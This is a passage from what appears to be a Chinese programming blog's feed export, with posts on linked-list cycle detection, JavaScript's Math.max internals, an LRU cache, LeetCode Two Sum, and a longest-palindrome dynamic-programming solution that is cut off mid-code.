<p>如图，设链表头到入环口的距离为$L$，环周长为$R$，慢指针$walker$和快指针$runner$ \textcolor{red}{第一次相遇}在节点 $cross$，其中入环口到相遇点$cross$距离为$S$，相遇时$runner$比 $walker$ 多走了 $n (n \in N+)$ 圈，此时$runner$的路程为$L + S + nR$，$walker$ 的路程为$L+R$，由于 $runner$ 的速度是$walker$ 的两倍，则：</p>
<p>$$ 2(L + S) &#x3D; L + S + nR $$</p>
<p>即：</p>
<p>$$ L &#x3D; nR - S $$</p>
<p>其中$R-S$ 表示从 $cross$ 到入环节点的距离，因此从$cross$点开始往前走$n$圈后，$nR - S$ 总是代表入环点。 如果两指针$fromCross$和$fromHead$分别以相同的速度从$cross$节点和起点$head$出发，当$fromHead$ 走到入环点处时，$fromCross$和$fromHead$的路程都为 $L$，又因为$L &#x3D; nR - S$，那么他们必定在入环点相遇，故可用如下程序找出入环点，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * function ListNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.next = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">ListNode</span>&#125; <span class="variable">head</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> &#123;<span class="type">ListNode</span>&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> detectCycle = <span class="keyword">function</span>(<span class="params">head</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> runner = head;</span><br><span class="line">    <span class="keyword">var</span> walker = head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (runner &amp;&amp; runner.<span class="property">next</span>) &#123;</span><br><span class="line">        walker = walker.<span class="property">next</span>;</span><br><span class="line">        runner = runner.<span class="property">next</span>;</span><br><span class="line">        runner = runner.<span class="property">next</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(runner === walker) &#123;</span><br><span class="line">            <span class="keyword">var</span> fromHead = head;</span><br><span class="line">            <span class="keyword">var</span> fromCross = runner;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (fromHead !== fromCross) &#123;</span><br><span class="line">                fromHead = fromHead.<span class="property">next</span>;</span><br><span class="line">                fromCross = fromCross.<span class="property">next</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> fromHead;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 查找数组最大值</title>
    <url>/fundamental/algorithm/algorithm-find-max-number-in-array/</url>
    <content><![CDATA[<p>JavaScript 中，提供 Math.max() 函数，使用方式如下：</p>
<pre><code>console.log( Math.max(3,5,8) ); // 8
</code></pre>
<p>其中参数以 list 形式给出，调用方式如：</p>
<pre><code>Math.max([value1[, value2[, ...]]])
</code></pre>
<p>详细使用方式参考 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/max">MDN</a></p>
<span id="more"></span>
<p>那么 Math.max 的内部实现机制是怎样的呢？</p>
<h2 id="Math-max-内部实现流程"><a href="#Math-max-内部实现流程" class="headerlink" title="Math.max 内部实现流程"></a>Math.max 内部实现流程</h2><p>首先我们来看一下 Math 对象。与其它全局对象不同的是，Math 不是一个构造器，而是是一个单例对象，按照 <a href="http://www.ecma-international.org/ecma-262/#sec-math-object">ES7</a>  官方文档，Math 对象挂载在全局对象（window 或 global）的 Math 属性上，所以 <code>Math.max()</code> 实际上等价于 <code>window.Math.max()</code> （Node 环境 <code>global.Math.max()</code>）。</p>
<p>查阅 <a href="http://es5.github.io/#x15.8.2.11">ES 5</a> 不难发现，调用 <code>Math.max()</code> 时基本流程如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">each param of  list ==&gt; toNumber ---&gt; ToPrimitive  ----&gt; Object.defaultValue --&gt; NaN</span><br></pre></td></tr></table></figure>
<p>参数列表中每个参数调用 toNumber 转为数值型， <a href="http://es5.github.io/#x9.3">toNumber</a> 函数中如果是 String 类型有一套转化规则，如果是 Object 先调用 <a href="http://es5.github.io/#x9.1">ToPrimitive</a> 方法将对象转为基本类型（non-Object）得到 primValue ，再返回 toNumber(primValue)。 primValue 则调用对象内部 <a href="http://es5.github.io/#x8.12.8">defualtValue</a> 方法得到，该方法最终规定了对象的 defualtValue 规则。</p>
<p>以上基本为 Math.max 的基本流程，Math.max 的容错规则如下：</p>
<ul>
<li><p>没有参数返回负无穷</p>
</li>
<li><p>只要任意参数为 NaN 则返回 NaN</p>
</li>
</ul>
<h2 id="再看-max-算法"><a href="#再看-max-算法" class="headerlink" title="再看 max 算法"></a>再看 max 算法</h2><p>了解 max 的工作机制以后我们看 <a href="https://github.com/v8/v8/blob/cd81dd6d740ff82a1abbc68615e8769bd467f91e/src/js/math.js#L77-L102">v8 源码</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ECMA 262 - 15.8.2.11</span><br><span class="line">function MathMax(arg1, arg2) &#123;  // length == 2</span><br><span class="line">  var length = %_ArgumentsLength(); // 获取参数长度</span><br><span class="line">  if (length == 2) &#123;</span><br><span class="line">    arg1 = TO_NUMBER(arg1); // 转为数值型</span><br><span class="line">    arg2 = TO_NUMBER(arg2);</span><br><span class="line">    if (arg2 &gt; arg1) return arg2;</span><br><span class="line">    if (arg1 &gt; arg2) return arg1;</span><br><span class="line">    if (arg1 == arg2) &#123;</span><br><span class="line">      // Make sure -0 is considered less than +0.</span><br><span class="line">      // +0 &gt; -0</span><br><span class="line">      return (arg1 === 0 &amp;&amp; %_IsMinusZero(arg1)) ? arg2 : arg1;</span><br><span class="line">    &#125;</span><br><span class="line">    // All comparisons failed, one of the arguments must be NaN.</span><br><span class="line">    return NaN;</span><br><span class="line">  &#125;</span><br><span class="line">  var r = -INFINITY;</span><br><span class="line">  // 遍历集合</span><br><span class="line">  for (var i = 0; i &lt; length; i++) &#123;</span><br><span class="line">    var n = %_Arguments(i);</span><br><span class="line">    n = TO_NUMBER(n);</span><br><span class="line">    // Make sure +0 is considered greater than -0.</span><br><span class="line">    // 出现 NaN 或者参数个数为 0 等情况</span><br><span class="line">    if (NUMBER_IS_NAN(n) || n &gt; r || (r === 0 &amp;&amp; n === 0 &amp;&amp; %_IsMinusZero(r))) &#123;</span><br><span class="line">      r = n;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查找算法很简单，就是遍历集合，算法复杂度为 O(n)，源码中做了很多容错处理，</p>
<h2 id="再看-apply"><a href="#再看-apply" class="headerlink" title="再看 apply"></a>再看 apply</h2><p>在 JavaScript 中，每个函数都是一个 Function 对象。Function 对象下有 apply、call 和 bind 等属性，很多文章都谈过 apply、call 和 bind 的作用和区别，apply、call 和 bind 都可以动态改变 this 指向。其中 apply 要求传递两个参数，第一个是 this 指向，第二个是数组，数组中的各元素最终被转成 list 集合，因此我们可以使用 apply 求数组元素最大值。如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Math.max.apply(obj, arr);</span><br></pre></td></tr></table></figure>
<p>执行过程：</p>
<ul>
<li><p>判断 Math.max() 是否允许被调用</p>
</li>
<li><p>判断 arr 是否为 null 或者 undefined，如果是以 obj 为 this 指向直接调用 Math.max()</p>
</li>
<li><p>判断 arr 是否为对象（数组也是对象），如果不是抛异常</p>
</li>
<li><p>遍历 arr 将其中元素以 list 集合形式作为参数传递给 Math.max()</p>
</li>
<li><p>使用 obj 身份调用 Math.max()，obj 对象获得 max() 函数的功能： obj.max(arr[0],…,arr[i])</p>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>动态改变函数调用者是 JavaScript 很灵活的地方，工作中应充分利用这一特点以提高工作效率。</p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>algorithm</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>LRU 实现</title>
    <url>/fundamental/algorithm/dev-lru-implementation/</url>
    <content><![CDATA[<h2 id="LRU-概述"><a href="#LRU-概述" class="headerlink" title="LRU 概述"></a>LRU 概述</h2><blockquote>
<p>This algorithm requires keeping track of what was used when, which is expensive if one wants to make sure the algorithm always discards the least recently used item. General implementations of this technique require keeping “age bits” for cache-lines and track the “Least Recently Used” cache-line based on age-bits. – from Wikipedia</p>
</blockquote>
<p>LRU 算法的思想是淘汰最近没有使用的缓存。</p>
<span id="more"></span>

<p><strong>Example:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LRUCache cache = new LRUCache( 2 /* capacity */ );</span><br><span class="line"></span><br><span class="line">cache.put(1, 1);</span><br><span class="line">cache.put(2, 2);</span><br><span class="line">cache.get(1);       // returns 1</span><br><span class="line">cache.put(3, 3);    // evicts key 2</span><br><span class="line">cache.get(2);       // returns -1 (not found)</span><br><span class="line">cache.put(4, 4);    // evicts key 1</span><br><span class="line">cache.get(1);       // returns -1 (not found)</span><br><span class="line">cache.get(3);       // returns 3</span><br><span class="line">cache.get(4);       // returns 4</span><br></pre></td></tr></table></figure>



<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>和大部分存储解构一样，LRU 的存储能力是有限的，所以当缓存满的时候我们需要一种算法来淘汰一部分数据。LRU 故名思意就是淘汰掉最近没有被使用的缓存。</p>
<p><code>get</code> 方法：如果元素不存在，直接返回 -1。如果元素存在，取出之后需要将当前元素移动到队列的头部。</p>
<p><code>put</code> 方法：如果元素不存在，直接将元素添加到队列头部，如果元素存在，将元素移动到队列头部。</p>
<p>按照这个思路，可以使用队列实现 LRU，但是无论是基于链表还是基于数组的队列都无法同时在 O(1) 时间内完成 <code>get</code> 和 <code>put</code> 方法。</p>
<p>对于 JavaScript，如果使用 <code>Map</code>，添加元素的时候 <code>map.keys()</code> 会自动记录元素的添加顺序。基于这个特点，我们可以用 Map 轻松的实现 LRU</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LRUCache</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">capacity</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">map</span> = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">capacity</span> = capacity;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">get</span>(<span class="params">key</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable language_">this</span>.<span class="property">map</span>.<span class="title function_">has</span>(key)) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> val = <span class="variable language_">this</span>.<span class="property">map</span>.<span class="title function_">get</span>(key);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">map</span>.<span class="title function_">delete</span>(key);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">map</span>.<span class="title function_">set</span>(key, val);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">put</span>(<span class="params">key, value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">map</span>.<span class="title function_">has</span>(key)) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">map</span>.<span class="title function_">delete</span>(key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">map</span>.<span class="title function_">set</span>(key, value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> keys = <span class="variable language_">this</span>.<span class="property">map</span>.<span class="title function_">keys</span>();</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable language_">this</span>.<span class="property">map</span>.<span class="property">size</span> &gt; <span class="variable language_">this</span>.<span class="property">capacity</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">map</span>.<span class="title function_">delete</span>(keys.<span class="title function_">next</span>().<span class="property">value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>LRU</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-01 —— Two Sum</title>
    <url>/fundamental/algorithm/lc-01-two-sum/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Given an array of integers, return <strong>indices</strong> of the two numbers such that they add up to a specific target.</p>
<p>You may assume that each input would have <strong>exactly</strong> one solution, and you may not use the <em>same</em> element twice.</p>
<span id="more"></span>
<p><strong>Example:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Given nums = [2, 7, 11, 15], target = 9,</span><br><span class="line"></span><br><span class="line">Because nums[0] + nums[1] = 2 + 7 = 9,</span><br><span class="line">return [0, 1].</span><br></pre></td></tr></table></figure>



<h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2><p>根据题意，每个输入都有解，因此数组元素个数一定是大于 2 </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 普通测试用例</span></span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="comment">// 重复元素测试</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="number">2</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="comment">// 元素只能使用一次测试用例</span></span><br><span class="line">[<span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>]</span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>



<h2 id="朴素算法"><a href="#朴素算法" class="headerlink" title="朴素算法"></a>朴素算法</h2><p><strong>储备知识</strong></p>
<ul>
<li><p>Java 数组定义</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] arr; <span class="comment">// 申明引用变量</span></span><br><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>]; <span class="comment">// 申明引用并且绑定(分配内存)</span></span><br><span class="line"><span class="type">int</span>[] arr = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;; <span class="comment">// 申明并且初始化：绑定 + 初始化</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;   <span class="comment">// 创建数组对象，不与引用变量做地址绑定，一般用于函数的 return 中，如下：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span>[] makeArray(<span class="type">int</span> a, <span class="type">int</span> b) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;a, b&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>Solution</strong></p>
<p>两层循环，需要特别注意的是每个元素只能使用一次，因此需要添加判断条件 <code>i != j</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(i != j &amp;&amp; nums[i] + nums[j] == target) &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;i, j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="使用-HashMap"><a href="#使用-HashMap" class="headerlink" title="使用 HashMap"></a>使用 HashMap</h2><p><strong>储备知识</strong></p>
<ul>
<li><p>Map</p>
<p>顾名思义， Map 是一种映射，就像是数学中的函数映射一样。 $ y &#x3D; f(x) $ 中，对于作用域内任意的 x 都有为一与之对应的值 y。 同理，在 Map  中，任意的 key 和 value 都有一一对应的关系。</p>
<p>Java 中，Map 是一个抽象接口，提供了常用的方法：</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="left">功能</th>
<th align="left">方法</th>
<th align="left">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="left">判断某个 key 是否存在 map 中</td>
<td align="left">boolean map.containsKey(key)</td>
<td align="left">map.get(key) &#x3D;&#x3D; null 也可以</td>
</tr>
<tr>
<td align="left">向 map 中插入元素</td>
<td align="left">object map.put(key, value)</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">根据 key 在 map 获取元素</td>
<td align="left">object map.get(key)</td>
<td align="left">如果key不存在，则返回 null</td>
</tr>
<tr>
<td align="left">判断 map 是否为空</td>
<td align="left">map.size() &#x3D;&#x3D; 0 或者 isEmpty()</td>
<td align="left">size() 返回键值对映射数量</td>
</tr>
</tbody></table>
<ul>
<li><p>泛型</p>
<blockquote>
<p><strong>泛型程序设计</strong>（generic programming）是<a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80">程序设计语言</a>的一种风格或<a href="https://zh.wikipedia.org/wiki/%E7%BC%96%E7%A8%8B%E8%8C%83%E5%9E%8B">范式</a>。泛型允许程序员在<a href="https://zh.wikipedia.org/wiki/%E5%BC%B7%E9%A1%9E%E5%9E%8B%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80">强类型程序设计语言</a>中编写代码时使用一些以后才指定的<a href="https://zh.wikipedia.org/wiki/%E7%B1%BB%E5%9E%8B">类型</a>，在<a href="https://zh.wikipedia.org/wiki/%E5%AE%9E%E4%BE%8B">实例化</a>时作为参数指明这些类型。</p>
<p>——维基百科</p>
</blockquote>
<p>意思就是在程序设计时使用一种通用的数据类型，在实例化的时候再指定具体的类型，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">generic</span><span class="params">(&lt;T&gt; T)</span> &#123;</span><br><span class="line">    <span class="comment">// code here ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>Solution</strong></p>
<p>根据 HashMap 的特点，我们可以将数组中的每个元素作为 key，数组元素的索引位置作为 value 构建一个 HashMap，然后遍历数组，遍历到第 i 个元素时，如果存在另一个元素与第 i 个元素之和等于 target，则</p>
<blockquote>
<p>让 key &#x3D; target - nums[i] , hashmap.containsKey(key) 返回 true</p>
</blockquote>
<p>按照如上想法，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; container = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// initialize container</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            container.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">key</span> <span class="operator">=</span> target - nums[i];</span><br><span class="line">            <span class="keyword">if</span> (container.containsKey(key)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;i, container.get(key)&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后运行第一个测试用例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[2,7,11,15]</span><br><span class="line">9</span><br></pre></td></tr></table></figure>

<p><strong>需要注意的是</strong>由于 HashMap 的 key 不允许重复，也就是说相同的 key 会被覆盖掉，试想如下测试用例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[2,2,2,2,3,4]</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p>这个测试用例返回的结果是 <code>[0, 3]</code> ，这是因为 hashmap 中 key 为 2 的 hash 值被多次修改，最终为 3。</p>
<p><strong>但是</strong>一个元素只能使用一次，试想如果 target - nums[i] 的值正好等于 nums[i] 的值会是怎样？</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[2, 1, 3]</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p>以上测试用例输出 <code>[0, 0]</code>，而正确答案应该是 <code>[1, 2]</code>。为了去重复，正确的判断条件应该是，</p>
<blockquote>
<p>让 key &#x3D; target - nums[i]，满足： hashmap.containsKey(key) 返回 true 且 hashmap.get(key) !&#x3D; i</p>
</blockquote>
<p>改进后的代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; container = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// initialize container</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            container.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">key</span> <span class="operator">=</span> target - nums[i];</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">value</span> <span class="operator">=</span> container.get(key);</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">null</span> != value &amp;&amp; value != i) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;i, value&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提交后，运行时 2s，打败 98.84%</p>
<p><img src="/images/2019-07/lc-01-1.png"></p>
<p><strong>解释：</strong> </p>
<ul>
<li><code>Integer value = container.get(key);</code> 这行代码中必须使用 <code>Integer</code> 类型，因为 HashMap 中不存在 key 时 <code>get(key)</code> 返回 null，null 代表空指针引用。</li>
<li><code>null != value &amp;&amp; value != i</code> ，此处 value 是 Integer 类型的 Object，因此与 null 可以进行比较运算，Integer 是基本类型 int 的包装器类型，在与 int 类型的 i 进行比较运算时，自动转换为 int 类型。</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://leetcode.com/problems/two-sum/discuss/3/Accepted-Java-O(n)-Solution">大神的骚操作</a></li>
</ul>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-5 Longest palindromic substring</title>
    <url>/fundamental/algorithm/lc-05-longest-palindromic-substring/</url>
    <content><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Given a string <strong>s</strong>, find the longest palindromic substring in <strong>s</strong>. You may assume that the maximum length of <strong>s</strong> is 1000.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: &quot;babad&quot;</span><br><span class="line">Output: &quot;bab&quot;</span><br><span class="line">Note: &quot;aba&quot; is also a valid answer.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: &quot;cbbd&quot;</span><br><span class="line">Output: &quot;bb&quot;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>给定一个字符串，求该字符串的最大回文字串的长度。如果一个字符串正序和逆序完全相同，则我们认为这个字符串是一个回文字符串。根据定义，若长度为 n 的字符串是回文字符串，则 <code>P[0] = P[n]</code>。</p>
<p> 以 <code>babad</code> 为例，按照如下步骤查找最大回文字串，</p>
<ol>
<li>因为字符串 <code>babad</code> 首位和末位不同，即 $b \neq d$，因此最长回文串要么在 <code>baba</code> 中，要么在 <code>abad</code> 中。(如果首位和末位相同时，如 <code>aba</code> 或 <code>abfbda</code>，如果当前字符串是回文字串，则当前字符串为当前问题的最长回文字串)</li>
<li>根据步骤 1 分别求 <code>baba</code> 和 <code>abad</code> 中的最长回文字串，他们中的最优解既是原原问题的最优解</li>
</ol>
<p>原问题的最优解由一个或多个子问题的最优解组合而成，我们认为问题满足最优子结构。</p>
<p><strong>像这样满足最优子结构且子问题有重叠的问题我们使用动态规划解决。</strong></p>
<p>通常按照如下 4 个步骤来设计一个动态规划算法：</p>
<ol>
<li>刻画<strong>最优解</strong>的结构特征</li>
<li>递归定义<strong>最优解的值</strong></li>
<li>计算最优解的值，通常采用<strong>自底向上</strong>的方法</li>
<li>利用计算出的信息构造一个最优解</li>
</ol>
<h2 id="第一步：刻画最优解的结构特征"><a href="#第一步：刻画最优解的结构特征" class="headerlink" title="第一步：刻画最优解的结构特征"></a>第一步：刻画最优解的结构特征</h2><p>记 $ X &#x3D; &lt;x_1, x_2, …, x_m&gt;$，$Z &#x3D; &lt;z_1, z_2, …, z_k&gt; $ ，若 Z 是 X 的一个最大回文字串，记 $P(X_{1,m}) &#x3D; Z$则</p>
<ol>
<li>若 $X_{1,m}$ 是回文字符串，则 Z &#x3D; X</li>
<li>否则 $Z \in {P(X_{1,m-1}), P(X_{1, m-1}) }$</li>
</ol>
<h2 id="第二步：递归定义最优解的值"><a href="#第二步：递归定义最优解的值" class="headerlink" title="第二步：递归定义最优解的值"></a>第二步：递归定义最优解的值</h2><p>根据最优解的特征，最优解的值满足如下公式：</p>
<p><img src="/images/2019-08/lc-05-01.png"></p>
<p>其中 $p(i, j)$ 表示$X_{i, j}$ 的最大回文串长度，即最优解的值。</p>
<h2 id="第三步：-计算最优解"><a href="#第三步：-计算最优解" class="headerlink" title="第三步： 计算最优解"></a>第三步： 计算最优解</h2><p>根据前面分析，写出代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestPalindrome</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(s) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">isPalindrome</span>(<span class="params">i, j</span>):</span><br><span class="line">            <span class="keyword">while</span> i &lt; j:</span><br><span class="line">                <span class="keyword">if</span> s[i] != s[j]:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                j -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            </span><br><span class="line">        dp = [[<span class="string">&quot;&quot;</span>] * <span class="built_in">len</span>(s) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">helper</span>(<span class="params">i, 